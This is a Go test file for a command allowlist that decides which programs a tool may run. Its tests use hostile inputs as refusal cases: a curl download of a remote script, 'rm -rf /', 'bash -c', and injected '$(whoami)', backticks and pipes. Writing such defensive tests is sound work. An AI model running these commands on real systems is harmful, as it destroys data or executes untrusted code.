package verify

import (
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

// TestAllowlistIsNeverDerivedFromInput has the name the design gives it, because
// the defect it guards is the one the previous product shipped: jacu_verify
// built its allowlist from the very commands it was asked to run, so every
// command authorized itself and the only enforcement left was the metachar
// filter. A hostile request for `curl https://x/y.sh -o /tmp/p` was allowed by
// construction.
func TestAllowlistIsNeverDerivedFromInput(t *testing.T) {
	allowlist := New(Config{})
	before := allowlist.Programs()

	hostile := []string{"curl", "https://example.invalid/y.sh", "-o", "/tmp/p"}
	if err := allowlist.Check(hostile); err == nil {
		t.Fatal("hostile argv was allowed; the allowlist must not be derived from the request")
	}
	// Asking again must not have taught it anything.
	if err := allowlist.Check(hostile); err == nil {
		t.Fatal("hostile argv allowed on the second call; the request mutated the policy")
	}
	if after := allowlist.Programs(); !reflect.DeepEqual(before, after) {
		t.Fatalf("programs changed after Check: before=%v after=%v", before, after)
	}
}

func TestCheckRejectionOrder(t *testing.T) {
	project := Config{
		Allow: []Entry{{Program: "mytool", RequiredArgPrefix: []string{"check"}}},
	}
	tests := []struct {
		name string
		argv []string
		want string
	}{
		{name: "global program with prefix", argv: []string{"go", "test", "./...", "-race"}},
		{name: "global program without required prefix", argv: []string{"gofmt", "-l", "."}},
		{name: "project program", argv: []string{"mytool", "check", "--all"}},

		{name: "empty argv", argv: nil, want: "missing program"},
		{name: "empty program", argv: []string{"", "test"}, want: "missing program"},
		{name: "program with slash", argv: []string{"/usr/bin/go", "test"}, want: "program path blocked"},
		{name: "program with backslash", argv: []string{`C:\go`, "test"}, want: "program path blocked"},
		{name: "relative program", argv: []string{"./go", "test"}, want: "program path blocked"},
		{name: "metachar in program", argv: []string{"go;rm", "test"}, want: "shell metachar in program"},
		{name: "metachar in arg", argv: []string{"go", "test", "; rm -rf /"}, want: "shell metachar in arg"},
		{name: "pipe in arg", argv: []string{"go", "test", "x|sh"}, want: "shell metachar in arg"},
		{name: "subshell in arg", argv: []string{"go", "test", "$(whoami)"}, want: "shell metachar in arg"},
		{name: "backtick in arg", argv: []string{"go", "test", "`id`"}, want: "shell metachar in arg"},
		{name: "redirect in arg", argv: []string{"go", "test", ">", "/tmp/x"}, want: "shell metachar in arg"},
		{name: "newline in arg", argv: []string{"go", "test\nrm -rf /"}, want: "shell metachar in arg"},
		{name: "shell program", argv: []string{"bash", "-c", "rm -rf /"}, want: "shell invocation blocked"},
		{name: "windows shell", argv: []string{"cmd.exe", "/C", "del"}, want: "shell invocation blocked"},
		{name: "interpreter flag", argv: []string{"python", "-c", "import os"}, want: "interpreter flag blocked"},
		{name: "traversal in arg", argv: []string{"go", "test", "../../other"}, want: "path traversal in arg blocked"},
		{name: "absolute path in arg", argv: []string{"go", "build", "-o", "/tmp/x"}, want: "absolute path in arg blocked"},
		{name: "windows absolute in arg", argv: []string{"go", "build", "-o", `C:\tmp\x`}, want: "absolute path in arg blocked"},
		{name: "unknown program", argv: []string{"make", "install"}, want: "command not in allowlist"},
		{name: "known program wrong prefix", argv: []string{"go", "generate"}, want: "command not in allowlist"},
		{name: "project program wrong prefix", argv: []string{"mytool", "deploy"}, want: "command not in allowlist"},
	}

	allowlist := New(project)
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := allowlist.Check(tt.argv)
			if tt.want == "" {
				if err != nil {
					t.Fatalf("Check(%v) = %v; want allowed", tt.argv, err)
				}
				return
			}
			if err == nil || !strings.Contains(err.Error(), tt.want) {
				t.Fatalf("Check(%v) = %v; want refusal containing %q", tt.argv, err, tt.want)
			}
		})
	}
}

// The shell check has to answer before the allowlist check. An interpreter is
// never allowlisted, so "command not in allowlist" would be true — and would
// teach the host to go looking for another shell instead of stopping.
func TestShellRefusalWinsOverNotAllowlisted(t *testing.T) {
	err := New(Config{}).Check([]string{"zsh", "-c", "echo hi"})
	if err == nil || !strings.Contains(err.Error(), "shell invocation blocked") {
		t.Fatalf("Check = %v; want the shell-specific refusal", err)
	}
}

// The recursive-forced removal predicate is a cross product, not a disjunction
// of pairs. Written as ((-r ∧ -f) ∨ (--recursive ∧ --force)) — the shape the
// heritage document originally described — `rm -r --force /` slips through.
func TestRecursiveForcedRemovalPredicateIsACrossProduct(t *testing.T) {
	allowlist := New(Config{Allow: []Entry{{Program: "rm"}}})
	for _, argv := range [][]string{
		{"rm", "-r", "-f", "target"},
		{"rm", "-r", "--force", "target"},
		{"rm", "-f", "--recursive", "target"},
		{"rm", "--recursive", "--force", "target"},
		{"rm", "-rf", "target"},
		{"rm", "-Rf", "target"},
	} {
		t.Run(strings.Join(argv, " "), func(t *testing.T) {
			err := allowlist.Check(argv)
			if err == nil || !strings.Contains(err.Error(), "recursive forced removal blocked") {
				t.Fatalf("Check(%v) = %v; want the removal refusal even though rm is allowlisted", argv, err)
			}
		})
	}
	// One half of the pair is not the predicate.
	if err := allowlist.Check([]string{"rm", "-r", "target"}); err != nil {
		t.Fatalf("Check(rm -r) = %v; only the recursive AND forced pair is refused", err)
	}
}

func TestEmptyAllowlistFailsClosed(t *testing.T) {
	allowlist := Allowlist{}
	if err := allowlist.Check([]string{"go", "test"}); err == nil ||
		!strings.Contains(err.Error(), "no allowlist configured") {
		t.Fatalf("Check = %v; want the fail-closed refusal", err)
	}
}

func TestProjectDenyRemovesGlobalEntry(t *testing.T) {
	if err := New(Config{}).Check([]string{"make", "test"}); err != nil {
		t.Fatalf("make test = %v; it ships in the global list", err)
	}
	denied := New(Config{Deny: []string{"make"}})
	if err := denied.Check([]string{"make", "test"}); err == nil ||
		!strings.Contains(err.Error(), "command not in allowlist") {
		t.Fatalf("Check = %v; deny must subtract from the global list", err)
	}
	// Deny wins over an explicit allow in the same file, so precedence cannot
	// be used to loosen policy by accident.
	both := New(Config{
		Allow: []Entry{{Program: "make", RequiredArgPrefix: []string{"test"}}},
		Deny:  []string{"make"},
	})
	if err := both.Check([]string{"make", "test"}); err == nil {
		t.Fatal("allow overrode deny; deny has to win")
	}
}

func TestLoadConfigReadsProjectRootAndFailsClosedOnMalformed(t *testing.T) {
	t.Run("absent file is normal", func(t *testing.T) {
		config, err := LoadConfig(t.TempDir())
		if err != nil {
			t.Fatalf("LoadConfig = %v; an absent file means the global list applies", err)
		}
		if len(config.Allow) != 0 || len(config.Deny) != 0 {
			t.Fatalf("config = %#v; want empty", config)
		}
	})

	t.Run("malformed file blocks", func(t *testing.T) {
		root := t.TempDir()
		writeConfig(t, root, "{not json")
		if _, err := LoadConfig(root); err == nil {
			t.Fatal("LoadConfig accepted broken JSON; a broken policy cannot degrade to no policy")
		}
	})

	t.Run("valid file is read", func(t *testing.T) {
		root := t.TempDir()
		writeConfig(t, root, `{"allow":[{"program":"just","required_arg_prefix":["test"]}],"deny":["make"],"path_dirs":["/opt/bin"]}`)
		config, err := LoadConfig(root)
		if err != nil {
			t.Fatalf("LoadConfig: %v", err)
		}
		if len(config.Allow) != 1 || config.Allow[0].Program != "just" {
			t.Fatalf("allow = %#v", config.Allow)
		}
		if len(config.Deny) != 1 || config.Deny[0] != "make" {
			t.Fatalf("deny = %#v", config.Deny)
		}
		if len(config.PathDirs) != 1 || config.PathDirs[0] != "/opt/bin" {
			t.Fatalf("path_dirs = %#v", config.PathDirs)
		}
	})
}

func writeConfig(t *testing.T, root, content string) {
	t.Helper()
	dir := filepath.Join(root, ".jacu")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		t.Fatalf("mkdir .jacu: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dir, "verify-allowlist.json"), []byte(content), 0o600); err != nil {
		t.Fatalf("write config: %v", err)
	}
}

// Traversal is a path component, not a substring. `./...` is the most common Go
// invocation there is and contains ".." — a rule that refuses it is broken, not
// conservative.
func TestTraversalIsCheckedByPathSegment(t *testing.T) {
	allowlist := New(Config{})
	allowed := [][]string{
		{"go", "test", "./..."},
		{"go", "test", "./internal/..."},
		{"go", "build", "./cmd/jacu"},
	}
	for _, argv := range allowed {
		if err := allowlist.Check(argv); err != nil {
			t.Fatalf("Check(%v) = %v; want allowed", argv, err)
		}
	}
	refused := [][]string{
		{"go", "test", ".."},
		{"go", "test", "../sibling"},
		{"go", "test", "internal/../../escape"},
		{"go", "test", `internal\..\..\escape`},
	}
	for _, argv := range refused {
		if err := allowlist.Check(argv); err == nil ||
			!strings.Contains(err.Error(), "path traversal in arg blocked") {
			t.Fatalf("Check(%v) = %v; want traversal refusal", argv, err)
		}
	}
}
